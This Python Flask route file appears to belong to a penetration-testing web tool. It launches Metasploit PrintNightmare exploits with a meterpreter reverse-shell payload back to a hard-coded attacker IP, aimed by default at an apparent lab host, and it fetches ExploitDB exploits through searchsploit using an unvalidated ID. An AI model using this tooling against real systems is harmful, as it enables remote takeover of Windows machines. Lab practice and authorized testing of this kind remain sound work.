# backend/app/routes/exploitation.py
from flask import Blueprint, request, jsonify
import subprocess
import os
from app.services.metasploit_service import MetasploitService
from app.utils.task_manager import create_task

exploit_bp = Blueprint("exploitation", __name__)

@exploit_bp.route("/metasploit/exploit", methods=["POST"])
def run_exploit():
    """Exécution d'exploit Metasploit"""
    data = request.get_json()
    exploit_name = data.get("exploit")
    target = data.get("target", "printnightmare.thm")
    payload = data.get("payload", "windows/x64/meterpreter/reverse_tcp")
    lhost = data.get("lhost", "172.20.0.2")  # IP de l'attaquant
    
    if not data.get("confirm_authorization"):
        return jsonify({"error": "Autorisation requise"}), 403
    
    metasploit_service = MetasploitService()
    task_id = create_task("metasploit_exploit", {
        "exploit": exploit_name,
        "target": target,
        "payload": payload,
        "lhost": lhost
    })
    
    # Exploits spécifiques Print Nightmare
    printnightmare_exploits = {
        "cve_2021_34527": "exploit/windows/dcerpc/cve_2021_34527_printnightmare",
        "cve_2021_1675": "exploit/windows/local/cve_2021_1675_printnightmare"
    }
    
    result = metasploit_service.run_exploit_async(
        printnightmare_exploits.get(exploit_name, exploit_name),
        target,
        payload,
        lhost,
        task_id
    )
    
    return jsonify({
        "task_id": task_id,
        "status": "started",
        "exploit": exploit_name,
        "target": target
    })

@exploit_bp.route("/download_exploit", methods=["POST"])
def download_exploit():
    """Téléchargement d'exploit depuis ExploitDB"""
    data = request.get_json()
    exploit_id = data.get("exploit_id")
    
    if not exploit_id:
        return jsonify({"error": "ID d'exploit requis"}), 400
    
    try:
        cmd = f"searchsploit -m {exploit_id}"
        result = subprocess.run(
            cmd.split(),
            capture_output=True,
            text=True,
            cwd="/app/reports"
        )
        
        if result.returncode == 0:
            return jsonify({
                "status": "downloaded",
                "output": result.stdout,
                "exploit_id": exploit_id
            })
        else:
            return jsonify({"error": result.stderr}), 500
            
    except Exception as e:
        return jsonify({"error": str(e)}), 500